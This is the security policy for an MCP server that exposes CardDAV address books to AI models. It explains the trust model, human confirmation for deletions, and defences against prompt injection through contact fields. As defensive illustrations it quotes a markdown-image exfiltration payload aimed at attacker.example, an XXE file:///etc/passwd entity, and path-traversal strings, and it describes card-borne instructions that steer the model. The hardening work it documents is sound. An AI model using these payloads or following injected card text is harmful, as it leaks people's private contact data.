# Security policy

## Reporting a vulnerability

Please use [GitHub private vulnerability reporting](https://github.com/ni-c/carddav-mcp/security/advisories/new).
Do not open a public issue for an unpatched vulnerability, and do not include real
credentials, tokens, hostnames or private configuration in a report.

You can expect an initial response within a week. Fixed vulnerabilities are published
as a new release with a note in the CHANGELOG.

## Supported versions

Only the latest release and the current `main` branch receive security fixes.

## Trust model

The credentials this server holds are an address book account. Anyone who obtains
them can read every contact it holds — which is a list of the people someone knows,
their private numbers, their home addresses and often notes about them, and which
belongs mostly to _other people_ rather than to the account owner — and, unless
`CARDDAV_READ_ONLY` is set, change or delete all of it. Prefer an app-specific
password over the account password where the provider offers one.

Treat every environment variable this server reads as a secret. The MCP client
process, and therefore the model driving it, sees every tool result — do not point
this server at an address book whose contents you would not put in a model's context.
`CARDDAV_ADDRESSBOOKS` exists for exactly that: it names the collections this server
may touch, and everything else on the account stays invisible to it. It is enforced
when an id is decoded rather than at the edge of each tool, so there is no path from
an id to a URL that skips the check — including a group membership change, which
resolves ids and would otherwise be the one place a fenced-off path could be named.
A listing reports how many collections it withheld rather than quietly showing a
shorter list.

The fence is keyed on the collection **path**, and the path is a string the CardDAV
server chose: discovery reads it out of the server's own `<D:href>`. The origin is
pinned and a collection has to sit under the home it was listed from, but a server
that presents any collection under a permitted path is a server that already holds
every card in it. `CARDDAV_ADDRESSBOOKS` bounds what _this server_ touches on a
cooperating backend; it is not a defence against a hostile one, and nothing here
claims to be. The same applies to `read_only`, which is what the server reported in
`current-user-privilege-set`. An entry that matches nothing is described by its
shape and length rather than quoted — the variable sits one line below the password
in every compose file, and an entry that matches nothing is exactly what a credential
pasted there looks like.

Destructive operations **ask a person** through MCP elicitation: a dialog raised by
the server and shown by the client, which the model cannot answer on its behalf, and
which nothing proceeds without. Where the client cannot show one they fall back to a
server-generated token bound to the specific target — which proves the call was made
twice with the same arguments and nothing more, and the fallback text says so rather
than implying somebody approved. `ELICITATION=false` moves a capable client onto that
fallback deliberately; it does not remove the guard, and the server prints one line
at startup saying it is off.

## What this server cannot do

Three capabilities are absent by construction rather than disabled by a setting, and
each absence is doing security work:

**It never fetches an address somebody else chose.** A `PHOTO` may be stored as a URI
rather than embedded, and this server reports that URI and does not retrieve it. No
tool takes a URL, so there is no way to make the process request one — which is why
there is no SSRF-guard module here at all, and why `openWorldHint` is `false` on
every tool without exception. The only host it speaks to is the one in `CARDDAV_URL`.

**It cannot create or delete an address book.** There is no `MKCOL` verb and no
collection-level `DELETE` in the code. The worst a defect in the addressing scheme
could reach is a single card, not somebody's entire address book. The integration
bootstrap creates its collections over the wire precisely because the server cannot,
so the suite never leans on a capability that is documented as missing.

**It does not import in bulk and it does not merge.** `export_contacts` reads;
nothing writes several cards in one call. A tool that took a vCard document and
created everything in it would turn one mistaken argument into four hundred cards,
and a merge tool would turn one wrong guess about which of two records is current
into silent data loss.

The property holds for _this server_, not for the session it runs in. If the same
agent also has a web-fetch tool, a shell, or another MCP server that can post
somewhere, contact data read through this server can be exfiltrated through that
other tool. Compose accordingly.

## Untrusted content

**An address book is rarely written only by its owner.** Cards arrive by import from
a phone, by sync from a company directory, and from anyone with write access to a
shared book. So formatted names, nicknames, organisations, titles, notes, categories
and address book display names are all treated as content a stranger wrote.

They are returned between markers carrying a per-call random nonce, with every line
inside prefixed by that nonce. Text written before the call cannot predict either, so
a card cannot close the block early and continue in the server's voice. A reminder
follows the block, because without one the last instruction-shaped sentence in the
model's context is the attacker's. Before that the text is normalised: zero-width and
directional-override characters are removed, and markdown image syntax — inline,
reference and shortcut style — is defused so a rendering client cannot be induced to
fetch a URL carrying data in its query string. That last one is the EchoLeak shape
([CVE-2025-32711](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-32711),
CVSS 9.3), where a single crafted message nobody opened exfiltrated data during
ordinary background processing.

Those passes run over **every** field, not only the note. There are two cleaners —
one that keeps paragraph breaks and caps at two thousand characters, one that
collapses a value to a single line and caps at four hundred — and no third path with
fewer passes. The distinction is worth writing down because it was got wrong once:
the short fields were stripped of invisible characters and nothing else, so a
formatted name of `![a](https://attacker.example/x.png?d=…)` reached the model
through `list_contacts` intact and unfenced. A name is not safer than a note by
virtue of being short.

**The attack that matters most here does not run a tool.** A card asserting that a
bank's real telephone number has changed, or that an invoice should now go to a
different account, needs the model to do nothing except repeat it. There is no call
to gate and no dialog to raise, so the only defence available is to say plainly that
a contact detail on a card is a claim and not a verified fact — which the framing
does, in the reminder after the block, and which `identity-substitution` reports as a
signal when it sees the shape.

The injection patterns the server recognises are reported as a **signal**, never used
to drop a card silently. A filter that appeared to work would be an argument for
trusting whatever got through, which is precisely the wrong conclusion: an attacker
who can iterate will find a phrasing the patterns do not match. Every pattern is timed
against tens of thousands of characters of its own trigger, because a pattern with an
unbounded run and no anchor is quadratic and this process is single-threaded with
stdio as its transport — a scan that takes a second on a real input takes the whole
server with it on a crafted one.

**Homoglyphs get their own signal.** `paypal` written with a Cyrillic `а` renders
identically to the real thing, and nothing folds the two together, because they are
genuinely different letters. In an address book that shows up exactly where it hurts:
in `FN` and `ORG`, the two fields a reader uses to decide whether a card is who it
claims to be.

Confirmation text never quotes a name, an organisation or a note. That text is read
by a human and by a model, and putting attacker-chosen prose into it would hand the
attacker the last word at exactly the wrong moment.

**Be clear about what framing buys.** Measured across models, delimiting untrusted
content takes resistance to injection from roughly 61% to roughly 90% — a real
improvement, and nowhere near a guarantee, with the weakest models benefiting least.
Against an attacker who adapts to the defence, prompt-level measures fail. They are a
speed bump. The architecture above is the wall.

## Addressing, and why ids are opaque

An id names an address book path and a card name, base64url-encoded. It never carries
an origin: the host is rebuilt from `CARDDAV_URL` on every decode, so a forged id
cannot point this server at a different server.

Within that, the check that matters is on the **resolved** path rather than on the
input. Checking a card name for a literal `/` is not the same check: the URL parser
normalises a percent-encoded dot segment and treats a backslash as a separator, so
`%2E%2E` walks up out of a collection and `%2e%2e\..\victim` lands in a different one.
Since the allowlist is enforced on the collection path, that would let a forged id
name a book it was allowed to touch and then address a card in one it was not. Every
join of a collection URL and a card name goes through one function that asserts the
resulting parent directory _is_ the collection, which holds against whatever encoding
is tried next.

There is deliberately **one** id tag rather than one per kind. A group is an ordinary
card carrying a marker property, in the same collection, indistinguishable by path —
so tagging an id as "group" would put a claim in it that only the card's content can
settle, and an id that can be wrong about what it names is worse than one that says
less. `get_group` reads the card and then says "that is a contact", which is a true
answer rather than a guess.

## XML and vCard parsing

Both formats are parsed from bytes a stranger wrote, and both have a well-known way
to go wrong.

The XML parser resolves no entities and refuses a `DOCTYPE` outright, so
billion-laughs expansion and `<!ENTITY … SYSTEM "file:///etc/passwd">` are not
defended against — they are not implemented. Because entities are therefore not
expanded by the parser, they are decoded where a text node becomes a value, and that
decode is where the interesting question lives: `&#13;&#10;` in a value this server
treats as a single line would end it and start something the server never sent.
Numeric references to C0/C1, surrogates and out-of-range code points are returned as
their source text rather than as characters.

There is exactly one exception, and it is reasoned rather than tolerated.
`address-data` is not a value but a document, and sabre/dav encodes that document's
own line endings as `&#13;` where Radicale writes them raw — under the strict rule
every card sabre returns is unparseable. CR and LF are therefore decoded for that one
node. It costs nothing: a hostile server can put a raw CRLF in that node directly, so
refusing the entity form protects against nothing there. Every other node keeps the
strict rule, which is where it still buys something.

The one genuinely free value this server writes into XML is the search string in a
`text-match`. It goes through an escaper that **refuses** control characters rather
than encoding them, and a test asserts that markup in a search term appears only as
escaped character data.

**A vCard from the wild is not a vCard from the specification.** ical.js decorates a
typed value on access and throws when the text does not fit the grammar, so a card
carrying `BDAY:not-a-date` — legal text some client wrote years ago — would take
`get_contact` down for the whole card rather than losing one field. Every read falls
back to the raw value when decoration fails.

## Writing

A `PUT` replaces an entire resource, so every write is a read-modify-write over the
parsed card rather than a rebuild from fields: fetch, parse, change only the named
properties, serialise, and send it back with `If-Match` carrying the ETag from that
same fetch. Unknown `X-` properties, an inline photo and parameters this server has
no concept of survive because they are never touched.

That invariant has a second half worth stating: a listing retrieves only the summary
properties, so the cards it returns are _incomplete by design_ and a write built on
one would delete everything not asked for. They are marked `partial`, and the write
path never accepts one — it issues its own `GET` every time.

Never `If-Match: *` — that is the absence of the safeguard wearing its clothes. A
weak ETag cannot protect a write under RFC 9110 and is refused with a reason.

`create_contact` generates the resource name itself and sends `If-None-Match: *`,
so a caller never chooses a path — which removes traversal and accidental
overwriting in one move. The UID is generated too unless a `raw_vcard` brings its
own: a pasted export keeps its identity, which is what makes an import round-trip
rather than duplicate. That means a caller _can_ reuse a UID another card already
carries, and membership is stored by UID — so `get_group` reports how many cards in
the book share one and resolves the first the server listed, rather than quietly
re-pointing a member at whichever card came last. Where a raw card replaces an
existing one, the **stored** UID is kept rather than the pasted one, for the same
reason.

A `raw_vcard` that is a group card (`KIND:group` or `X-ADDRESSBOOKSERVER-KIND`) is
refused by both contact tools: `create_contact` would otherwise create a group past
`create_group`'s convention choice, and `update_contact` would turn a contact into
a group under a dialog that said "replace a contact card". `delete_contact` and
`move_contact` refuse a group id the same way `update_contact` does — the group
tools are separable in `CARDDAV_ALLOW_TOOLS` and `CARDDAV_DENY_TOOLS` only if no
contact tool can reach a group.
